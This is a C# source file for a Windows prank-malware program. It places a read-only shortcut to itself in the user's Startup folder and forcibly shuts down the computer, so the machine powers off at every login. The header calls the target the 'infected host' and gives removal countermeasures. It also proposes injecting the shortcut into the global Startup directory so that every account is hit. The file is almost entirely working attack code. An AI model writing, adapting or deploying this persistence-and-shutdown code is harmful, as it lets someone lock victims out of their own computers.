using System;
using System.IO;
using System.Timers;
using IWshRuntimeLibrary;
using System.Diagnostics;

/*=============================================================================
 |       AUTHOR:  KESLER MATHIEU
 |     COMPILER:  Visual C# Command Line Compiler v2.9.0.63208
 |     TO COMPILE VIA CMD LINE:  csc /reference:{filepath}\Interop.IWshRuntimeLibrary.dll .\ShutDown.cs
 |     DEPENDENCY: Interop.IwshRuntimeLibrary.dll
 +-----------------------------------------------------------------------------
 |
 |  DESCRIPTION:  ***WARNING!!!*** RUNNING THE EXECUTABLE IS AT YOUR DISCRETION.
 |
 |        INPUT:  N/A - (OTHER THAN RUNNING THIS FILE)
 |
 |       OUTPUT:  CREATES A SHUTDOWN.LNK FILE IN A USER'S STARTUP DIRECTORY THAT 
 |                CALLS THE "Shutdown.exe" APPLICATION EVERYTIME THE HOST'S
 |                ACCOUNT IS LOGGED INTO. This "Shutdown.exe" APP CREATES AND RUNS
 |                THE "C:\Windows\System32\shutdown.exe" PROCESS WHICH WILL 
 |                FORCIBLY TURN OFF YOUR COMPUTER. WITH THIS SETUP, YOUR COMPUTER WILL TURN
 |                 OFF EVERY TIME THE INFECTED HOST LOGGS IN.
 |
 | COUNTERMEASURES: RUN WINDOWS IN SAFE MODE AND NAVIGATE TO THE STARTUP FOLDER. DELETE THE
 |                  SHUTDOWN.LNK FILE. AS ANOTHER CHOICE, GIVEN 'displayDestructionMsg()'
 |                  IS DELAYED IN SECONDS, PRESS SPACE BUTTON TO PAUSE EXECUTION AND
 |                  DELETE FILES BEFORE EXECUTION OCCURS!
 |
 | IMPROVEMENTS: 1 - OVERRIDING PERMISSIONS ON THE GLOBAL STARTUP DIRECTORY AND INJECTING
 |               THE SHUTDOWN.LNK FILE INTO IT WILL BE CATASTROPHIC TO A COMPUTER
 |               AS PROGRAMS WITHIN THE GLOBAL DIRECTORY TAKES RUNNING PRECEDENCE 
 |               OVER APPLICATIONS IN THE LOCAL STARTUP. THIS IMPLIES THAT ALL USER ACCOUNTS
 |               WILL SHUTOFF WHEN LOGGED INTO!
 |
 |   Known Bugs:  N/A
 |
 *===========================================================================*/
namespace WindowExecutables_v2._0
{
    public sealed class ShutDown
    {
        private string localStartupDir;
        private static readonly string SHUTDOWN_CMD = @"C:\Windows\System32\shutdown.exe";
        private static readonly string SHUTDOWN_ARGS = "/s /f /t 0";
        private static readonly string C_SHARP_EXE = "ShutDown.exe";

        public ShutDown()
        {
            string pathTemplate = @"C:\Users\{0}\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\";
            this.localStartupDir = pathTemplate.Replace("{0}", Environment.UserName);
        }

        public string getLocalStartupDir()
        {
            return this.localStartupDir;
        }
        public static void displayDestructionMsg(int countdown)
        {
            if (countdown > 0)
                {
                string img = @"
                                         ::================:          
                                        / ||              ||        
                                       /  ||    System    ||        
                                      |   ||   ShutDown   ||                
                                       \  || Please wait..||
                                        \ ||              || 
                                         ::=================              
                                   ........... /      \.............                                                         
                                   :\        ############            \   
                                   : ---------------------------------     
                                   : |  *   |__________|| ::::::::::  |                                             
                                   \ |      |          ||   .......   |    
                                     --------------------------------- 8   
                                                                        8 
                                     --------------------------------- 8   
                                     \   ###########################  \    
                                      \  +++++++++++++++++++++++++++   \ 
                                       \ ++++++++++++++++++++++++++++   \
                                        \________________________________\ 
                                         ********************************* 
                                            -Targon (Ed Wisniewski)-";

                Console.WriteLine(img+"\n");

                while (countdown >= 0)
                    {
                    Console.WriteLine("                                    COMPUTER WILL PERMANENTLY CEASE TO OPERATE IN: " + countdown.ToString() + " SECONDS!");
                    countdown--;
                    System.Threading.Thread.Sleep(1000);
                    }
                }
        }
        public string getAppCurrentDirectory()
        {
            string dir = "";
            try
            {
                dir = Directory.GetCurrentDirectory();
            }
            catch (Exception e)
            {
                Console.WriteLine("Exception caught: " + e.ToString());
            }
            return dir + @"\";
        }

        public bool createShortcutFile(string targetFile)
        {
            bool isCreated = false;
            string shortcutFile = this.localStartupDir + "ShutDown.lnk";
            Console.WriteLine(shortcutFile);
            if (!System.IO.File.Exists(shortcutFile))
            {
                try
                {
                    WshShell shell = new WshShell();
                    IWshShortcut link =
                    (IWshShortcut)shell.CreateShortcut(shortcutFile);
                    link.TargetPath = targetFile;
                    link.Save();
                    System.IO.File.SetAttributes(shortcutFile, FileAttributes.ReadOnly);
                    isCreated = true;
                    return isCreated;
                }
                catch (Exception e)
                {
                    Console.WriteLine("Exception caught: " + e.ToString());
                }
            }
            return isCreated;
        }
        public bool runTurnOffCMD()
        {
            Process myProcess = new Process();
            //dummy executable process for testing
            //myProcess.StartInfo.FileName = "iexplore.exe";
            myProcess.StartInfo.FileName = SHUTDOWN_CMD;
            myProcess.StartInfo.Arguments = SHUTDOWN_ARGS;
            myProcess.StartInfo.UseShellExecute = false;
            myProcess.StartInfo.CreateNoWindow = true;
            try
            {
                return myProcess.Start();
            }
            catch (Exception e)
            {
                Console.WriteLine("Exception caught " + e.ToString());
            }
            return false;
        }

        public static void Main()
        {
            //remove for faster shutdown
            ShutDown.displayDestructionMsg(countdown:10);
            ShutDown sysOff = new ShutDown();

            if (!System.IO.File.Exists(sysOff.getLocalStartupDir() + "ShutDown.lnk")){
                sysOff.createShortcutFile(targetFile: sysOff.getAppCurrentDirectory() + C_SHARP_EXE);
            }
            sysOff.runTurnOffCMD();
        }
    }
}